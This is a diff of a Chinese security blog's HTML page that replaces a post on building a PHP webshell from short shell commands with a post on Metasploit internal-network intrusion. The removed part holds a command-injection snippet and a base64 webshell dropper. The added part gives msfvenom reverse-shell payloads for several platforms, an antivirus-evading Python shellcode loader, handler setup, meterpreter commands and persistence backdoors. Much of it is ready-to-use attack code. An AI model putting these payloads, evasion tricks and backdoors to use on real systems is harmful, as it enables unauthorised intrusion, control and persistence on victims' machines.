@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          Linux下短字符写shell - Rootclay
+          In-Net MSF - Rootclay
         
     </title>
 
-    <link rel="canonical" href="http://rootclay.github.io/2017/01/26/linux_doc_shell/">
+    <link rel="canonical" href="http://rootclay.github.io/2017/08/07/msf/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -88,14 +88,12 @@
                             
                               <a class="tag" href="/tags/#Web" title="Web">Web</a>
                             
-                              <a class="tag" href="/tags/#Linux" title="Linux">Linux</a>
-                            
                         </div>
-                        <h1>Linux下短字符写shell</h1>
-                        <h2 class="subheading">Linux下短字符写shell.</h2>
+                        <h1>In-Net MSF</h1>
+                        <h2 class="subheading">内网代理的个人总结.</h2>
                         <span class="meta">
                             Posted by Rootclay on
-                            2017-01-26
+                            2017-08-07
                         </span>
                     </div>
                 
@@ -212,39 +210,76 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="linux下短字符写shell">Linux下短字符写shell</h1>
-<h2 id="代码">代码</h2>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>]) &lt; <span class="number">8</span>) &#123;</div><div class="line">  <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<h2 id="背景知识">背景知识</h2>
-<p>1、linux下写文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a&gt;1.txt</div></pre></td></tr></table></figure>
-<p>这样就会在本目录下生成一个1.txt文件，内容会有a</p>
-<p>2、linux下本行无法执行完命令时</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> 1&gt;\</div><div class="line">1.php</div></pre></td></tr></table></figure>
-<p>这样会在本目录下生成一个1.php，内容为1</p>
-<p>3、ls<br>
-ls命令会列出本目录下的所有文件和目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls -t</div></pre></td></tr></table></figure>
-<p>这条命令会按时间倒叙列出本目录的所有文件</p>
-<h2 id="正题">正题</h2>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">w&gt;hp</div><div class="line">w&gt;y.p\\</div><div class="line">w&gt;cla\\</div><div class="line">w&gt;d\&gt;\\</div><div class="line">w&gt;\ -\\</div><div class="line">w&gt;e64\\</div><div class="line">w&gt;bas\\</div><div class="line">w&gt;7\|\\</div><div class="line">w&gt;XSk\\</div><div class="line">w&gt;Fsx\\</div><div class="line">w&gt;dFV\\</div><div class="line">w&gt;kX0\\</div><div class="line">w&gt;bCg\\</div><div class="line">w&gt;XZh\\</div><div class="line">w&gt;AgZ\\</div><div class="line">w&gt;waH\\</div><div class="line">w&gt;PD9\\</div><div class="line">w&gt;o\ \\</div><div class="line">w&gt;ech\\</div><div class="line">ls -t&gt;0</div><div class="line">sh 0</div></pre></td></tr></table></figure>
-<p>当我们在bash中执行上面的语句时，会在本目录下生成一个clay.php内容为</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_GET</span>[1]);</div></pre></td></tr></table></figure>
-<p>测试代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">"http://127.0.0.1/"</span></div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">"file.txt"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</div><div class="line">        index = requests.get(url, params=i)</div><div class="line">        <span class="keyword">print</span> <span class="string">"已经请求%s"</span> % i</div><div class="line"></div><div class="line">url_fix = url + <span class="string">"clay.php"</span></div><div class="line">res = requests.get(url_fix)</div><div class="line"><span class="keyword">print</span> res.status_code</div></pre></td></tr></table></figure>
+                <blockquote>
+<p>总结需要用到的msf技巧</p>
+</blockquote>
+<h2 id="msf内网渗透">MSF内网渗透</h2>
+<h3 id="流程">流程</h3>
+<ol>
+<li>
+<p>生成Payload：</p>
+<ol>
+<li>生成Python<br>
+<code>msfvenom -p windows/meterpreter/reverse_http LPORT=443 LHOST=IP -e x86/shikata_ga_nai -i 11 -f py -o ~/clay.py</code></li>
+<li>生成Exe<br>
+<code>msfvenom -p windows/x64/meterpreter_reverse_tcp -e -i 3 LHOST=172.22.25.51 LPORT=23333 -f exe -o ~/Desktop/shell.exe</code></li>
+<li>生成java payload<br>
+<code>msfvenom -p java/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333 -o ~/Desktop/123.jar</code></li>
+<li>生成php payload<br>
+<code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.42.0.1 LPORT=23333 -o ~/Desktop/123.php</code></li>
+<li>生成Linux payload<br>
+<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333 -f elf -o ~/Desktop/123.elf</code></li>
+<li>生成Android的payload<br>
+<code>msfvenom -p android/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333 -o ~/Desktop/1234.apk</code><br>
+生</li>
+</ol>
+</li>
+<li>
+<p>免杀Payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> ctypes</div><div class="line"></div><div class="line">/*</div><div class="line">code</div><div class="line">*/</div><div class="line"></div><div class="line"><span class="comment">#libc = CDLL('libc.so.6')</span></div><div class="line">PROT_READ = <span class="number">1</span></div><div class="line">PROT_WRITE = <span class="number">2</span></div><div class="line">PROT_EXEC = <span class="number">4</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">executable_code</span><span class="params">(buffer)</span>:</span></div><div class="line">    buf = c_char_p(buffer)</div><div class="line">    size = len(buffer)</div><div class="line">    addr = libc.valloc(size)</div><div class="line">    addr = c_void_p(addr)</div><div class="line">    <span class="keyword">if</span> <span class="number">0</span> == addr:  </div><div class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to allocate memory"</span>)</div><div class="line">    memmove(addr, buf, size)</div><div class="line">    <span class="keyword">if</span> <span class="number">0</span> != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</div><div class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to set protection on buffer"</span>)</div><div class="line">    <span class="keyword">return</span> addr</div><div class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</div><div class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</div><div class="line">shellcode = bytearray(buf)</div><div class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()    </div><div class="line"><span class="keyword">if</span> whnd != <span class="number">0</span>:</div><div class="line">	<span class="keyword">if</span> <span class="number">666</span>==<span class="number">666</span>:</div><div class="line">		ctypes.windll.user32.ShowWindow(whnd, <span class="number">0</span>)    </div><div class="line">		ctypes.windll.kernel32.CloseHandle(whnd)</div><div class="line"><span class="keyword">print</span> <span class="string">".................................."</span>*<span class="number">666</span></div><div class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</div><div class="line">                                          ctypes.c_int(len(shellcode)),</div><div class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</div><div class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</div><div class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</div><div class="line">old = ctypes.c_long(<span class="number">1</span>)</div><div class="line">VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</div><div class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</div><div class="line">                                     buf,</div><div class="line">                                     ctypes.c_int(len(shellcode)))</div><div class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</div><div class="line"><span class="keyword">print</span> <span class="string">"Code By Root"</span></div><div class="line">shell()</div></pre></td></tr></table></figure>
+<p><code>python PyInstaller.py --console --onefile clay.py</code></p>
+</li>
+<li>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</div><div class="line"><span class="built_in">set</span> LPORT 443</div><div class="line"><span class="built_in">set</span> LHOST 0.0.0.0</div><div class="line">exploit</div><div class="line"></div><div class="line">msfconsole -r <span class="built_in">command</span></div></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="meterpreter的常用命令">Meterpreter的常用命令</h3>
+<ol>
+<li>
+<p>基本命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">background <span class="comment"># 让meterpreter处于后台模式</span></div><div class="line"></div><div class="line">sessions -i index <span class="comment"># 与会话进行交互，index表示第一个session</span></div><div class="line"></div><div class="line">quit <span class="comment"># 退出会话</span></div><div class="line"></div><div class="line">shell <span class="comment"># 获得控制台权限</span></div><div class="line"></div><div class="line">irb <span class="comment"># 开启ruby终端</span></div></pre></td></tr></table></figure>
+</li>
+<li>
+<p>文件系统命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">cat <span class="comment"># 查看文件内容</span></div><div class="line"></div><div class="line">getwd <span class="comment"># 查看当前工作目录</span></div><div class="line"></div><div class="line">upload <span class="comment"># 上传文件到目标机上</span></div><div class="line"></div><div class="line">download <span class="comment"># 下载文件到本机上</span></div><div class="line"></div><div class="line">edit <span class="comment"># 编辑文件</span></div><div class="line"></div><div class="line">search <span class="comment"># 搜索文件</span></div></pre></td></tr></table></figure>
+</li>
+<li>
+<p>网络命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ipconfig / ifconfig <span class="comment"># 查看网络接口信息</span></div><div class="line"></div><div class="line">portfwd add -l 4444 -p 3389 -r 192.168.1.102 <span class="comment"># 端口转发，本机监听4444，把目标机3389转到本机4444</span></div><div class="line"></div><div class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 <span class="comment">#然后使用rdesktop来连接，-u 用户名 -p 密码</span></div><div class="line"></div><div class="line">route <span class="comment"># 获取路由表信息</span></div></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="3">
+<li>
+<p>系统命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">ps <span class="comment"># 查看当前活跃进程</span></div><div class="line"></div><div class="line">migrate pid <span class="comment"># 将Meterpreter会话移植到进程数位pid的进程中</span></div><div class="line"></div><div class="line">execute -H -i -f cmd.exe <span class="comment"># 创建新进程cmd.exe，-H不可见，-i交互</span></div><div class="line"></div><div class="line">getpid <span class="comment"># 获取当前进程的pid</span></div><div class="line"></div><div class="line"><span class="built_in">kill</span> pid <span class="comment"># 杀死进程</span></div><div class="line"></div><div class="line">getuid <span class="comment"># 查看权限</span></div><div class="line"></div><div class="line">sysinfo <span class="comment"># 查看目标机系统信息，如机器名，操作系统等</span></div><div class="line"></div><div class="line">shutdown <span class="comment"># 关机</span></div></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="植入后门">植入后门</h3>
+<h4 id="persistence">persistence</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Meterpreter &gt; run persistence -X -i 5 -p 443 -r ip</div><div class="line">-X 开机启动 -i 连接间隔</div></pre></td></tr></table></figure>
+<h4 id="metsvc">metsvc</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Meterpreter  &gt; run metsvc</div></pre></td></tr></table></figure>
+
                 
 
                 <hr>
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2017/03/08/dockerfile基础/" data-toggle="tooltip" data-placement="top" title="Dockerfile">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2017/01/24/js_hosting/" data-toggle="tooltip" data-placement="top" title="JavaScript中变量提升">Next Post &rarr;</a>
+                            <a href="/2017/08/02/clean_log/" data-toggle="tooltip" data-placement="top" title="日志清理">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -274,7 +309,7 @@ ls命令会列出本目录下的所有文件和目录</p>
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#linux下短字符写shell"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Linux下短字符写shell</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#代码"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">代码</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#背景知识"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">背景知识</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#正题"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">正题</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#msf内网渗透"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">MSF内网渗透</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#流程"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">流程</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#meterpreter的常用命令"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">Meterpreter的常用命令</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#植入后门"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">植入后门</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#persistence"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">persistence</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#metsvc"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">metsvc</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
@@ -295,8 +330,6 @@ ls命令会列出本目录下的所有文件和目录</p>
                     <div class="tags">
                        
                           <a class="tag" href="/tags/#Web" title="Web">Web</a>
-                        
-                          <a class="tag" href="/tags/#Linux" title="Linux">Linux</a>
                         
                     </div>
                 </section>
@@ -343,8 +376,8 @@ ls命令会列出本目录下的所有文件和目录</p>
 <script type="text/javascript">
     /* * * CONFIGURATION VARIABLES * * */
     var disqus_shortname = "your-disqus-ID";
-    var disqus_identifier = "http://rootclay.github.io/2017/01/26/linux_doc_shell/";
-    var disqus_url = "http://rootclay.github.io/2017/01/26/linux_doc_shell/";
+    var disqus_identifier = "http://rootclay.github.io/2017/08/07/msf/";
+    var disqus_url = "http://rootclay.github.io/2017/08/07/msf/";
 
     (function() {
         var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
